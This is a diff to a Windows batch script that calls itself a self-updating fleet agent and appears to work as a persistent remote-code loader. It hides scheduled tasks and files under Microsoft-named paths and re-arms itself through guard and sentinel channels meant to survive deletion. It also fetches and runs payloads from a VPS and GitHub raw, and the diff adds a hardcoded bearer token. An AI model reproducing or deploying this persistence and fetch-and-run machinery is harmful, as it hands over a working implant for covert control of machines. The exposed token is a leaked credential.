@@ -1,16 +1,21 @@
 @echo off
-rem WINRTCS_AGENT 0.0.2 - self-updating fleet agent (batch+curl only, no PowerShell)
+rem WINRTCS_AGENT 0.0.3 - self-updating fleet agent (batch+curl only, no PowerShell)
 rem Tick: re-arm tasks (pair + sentinel) -> stage/apply self-update (SHA256 pinned)
 rem   -> run payload once per PAYLOAD_VER -> guard channel -> sentinel channel -> cache sync.
 rem 0.0.2 (C19): sentinel third-re-armer channel (SENTINEL_SHA256 pinned, lives in the
 rem   resurrection cache); hash-gated cache mirroring (only pinned-hash-verified files are
 rem   copied); run.cmd self-repair (RUN_SHA256); guard invoked via a temp copy so an attacker
 rem   deleting winrtcs_guard.cmd mid-run can't abort the health cycle.
+rem 0.0.3 (C20): dual-URL transport - all fetches try the VPS mirror first (HTTPS + bearer,
+rem   Cloudflare-fronted) and fall back to GitHub raw. Token gates privacy only; integrity is
+rem   SHA256-pinned per file from winrtcs.version. A dead VPS never bricks the fleet.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
+set "BASE2=https://debian.seczio.com/winrtcs"
+set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
 set "LOG=%ZD%\agent.log"
 set "TASKA=\Microsoft\Windows\WinRTCS\Agent"
 set "TASKG=\Microsoft\Windows\WinRTCS\Guard"
@@ -65,8 +70,7 @@ rem --- rotate log ---
 if exist "%LOG%" for %%L in ("%LOG%") do if %%~zL GTR 204800 move /y "%LOG%" "%LOG%.old" >nul 2>&1
 
 rem --- fetch version ---
-del /f /q "%VFILE%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%VFILE%" "%BASE%/winrtcs.version?t=%RANDOM%%RANDOM%" >nul 2>&1
+call :Fetch winrtcs.version "%VFILE%"
 if not exist "%VFILE%" ( endlocal & exit /b 0 )
 findstr /C:"AGENT_SHA256=" "%VFILE%" >nul 2>&1
 if errorlevel 1 ( endlocal & exit /b 0 )
@@ -92,8 +96,7 @@ rem --- agent self-update: stage .new now, applied + re-exec at top of next run 
 if defined AGENT_SHA (
   call :Sha256 "%ZD%\winrtcs_agent.cmd" CUR_SHA
   if /I not "!CUR_SHA!"=="!AGENT_SHA!" (
-    del /f /q "%ZD%\agent.dl" >nul 2>&1
-    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\agent.dl" "%BASE%/winrtcs_agent.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    call :Fetch winrtcs_agent.cmd "%ZD%\agent.dl"
     set "DL_SHA="
     if exist "%ZD%\agent.dl" call :Sha256 "%ZD%\agent.dl" DL_SHA
     if defined DL_SHA if /I "!DL_SHA!"=="!AGENT_SHA!" (
@@ -111,8 +114,7 @@ rem --- run.cmd self-repair: stager is the tasks' entry point, keep it hash-pinn
 if defined RUN_SHA (
   call :Sha256 "%ZD%\winrtcs_run.cmd" RUN_CUR
   if /I not "!RUN_CUR!"=="!RUN_SHA!" (
-    del /f /q "%ZD%\run.dl" >nul 2>&1
-    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%ZD%\run.dl" "%BASE%/winrtcs_run.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    call :Fetch winrtcs_run.cmd "%ZD%\run.dl"
     set "R_SHA="
     if exist "%ZD%\run.dl" call :Sha256 "%ZD%\run.dl" R_SHA
     if defined R_SHA if /I "!R_SHA!"=="!RUN_SHA!" (
@@ -130,8 +132,7 @@ rem --- payload: run exactly once per PAYLOAD_VER (payloads must be idempotent) 
 set "LVER="
 if exist "%ZD%\payload.ver" set /p "LVER=" <"%ZD%\payload.ver"
 if defined PVER if defined PAYLOAD_SHA if /I not "!PVER!"=="!LVER!" (
-  del /f /q "%ZD%\payload.dl" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\payload.dl" "%BASE%/winrtcs_payload.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+  call :Fetch winrtcs_payload.cmd "%ZD%\payload.dl"
   set "PL_SHA="
   if exist "%ZD%\payload.dl" call :Sha256 "%ZD%\payload.dl" PL_SHA
   if defined PL_SHA if /I "!PL_SHA!"=="!PAYLOAD_SHA!" (
@@ -153,8 +154,7 @@ if defined GUARD_VER if defined GUARD_SHA (
   set "LGVER="
   if exist "%ZD%\guard.ver" set /p "LGVER=" <"%ZD%\guard.ver"
   if /I not "!LGVER!"=="!GUARD_VER!" (
-    del /f /q "%ZD%\guard.dl" >nul 2>&1
-    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\guard.dl" "%BASE%/winrtcs_guard.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    call :Fetch winrtcs_guard.cmd "%ZD%\guard.dl"
     set "G_SHA="
     if exist "%ZD%\guard.dl" call :Sha256 "%ZD%\guard.dl" G_SHA
     if defined G_SHA if /I "!G_SHA!"=="!GUARD_SHA!" (
@@ -190,8 +190,7 @@ if defined SENT_SHA (
   set "SENT_CUR="
   if exist "%CD%\winrtcs_sentinel.cmd" call :Sha256 "%CD%\winrtcs_sentinel.cmd" SENT_CUR
   if /I not "!SENT_CUR!"=="!SENT_SHA!" (
-    del /f /q "%ZD%\sentinel.dl" >nul 2>&1
-    "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%ZD%\sentinel.dl" "%BASE%/winrtcs_sentinel.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+    call :Fetch winrtcs_sentinel.cmd "%ZD%\sentinel.dl"
     set "S_SHA="
     if exist "%ZD%\sentinel.dl" call :Sha256 "%ZD%\sentinel.dl" S_SHA
     if defined S_SHA if /I "!S_SHA!"=="!SENT_SHA!" (
@@ -229,6 +228,16 @@ if defined GUARD_SHA (
 if exist "%VFILE%" copy /y "%VFILE%" "%CD%\winrtcs.version" >nul 2>&1
 
 endlocal & exit /b 0
+
+:Fetch
+rem %1 = repo-relative filename, %2 = destination. VPS mirror first (HTTPS + bearer,
+rem Cloudflare-fronted), GitHub raw fallback. Success = non-trivial file landed; callers
+rem still do their own marker/hash validation of the content.
+del /f /q "%~2" >nul 2>&1
+if defined TOK "%CURL%" -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 6 --max-time 25 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
+exit /b 0
 
 :Sha256
 set "%~2="
